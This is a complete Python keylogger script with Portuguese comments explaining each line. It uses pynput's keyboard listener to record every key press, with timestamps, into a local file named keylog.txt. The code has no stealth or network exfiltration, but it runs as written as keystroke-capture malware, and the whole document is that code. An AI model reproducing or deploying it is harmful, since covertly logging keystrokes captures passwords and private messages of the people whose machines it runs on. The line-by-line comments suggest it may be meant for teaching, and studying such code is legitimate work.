import logging #Importa o módulo de registro de eventos chamado logging.
from pynput import keyboard #Importa a classe de teclado do módulo pynput.
 
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s") #Configura o registro de eventos para escrever em um arquivo chamado "keylog.txt". Define o nível de registro como DEBUG e especifica o formato da mensagem.
 
def on_press(key): #Define uma função chamada "on_press" que será chamada quando uma tecla for pressionada.
    logging.info(str(key)) #Registra a tecla pressionada convertendo-a em uma string.
 
with keyboard.Listener(on_press=on_press) as listener: #Cria um objeto de escuta de teclado chamado "listener" que chama a função "on_press" quando uma tecla é pressionada.
    listener.join() #Inicia a escuta do teclado e aguarda até que a escuta seja interrompida.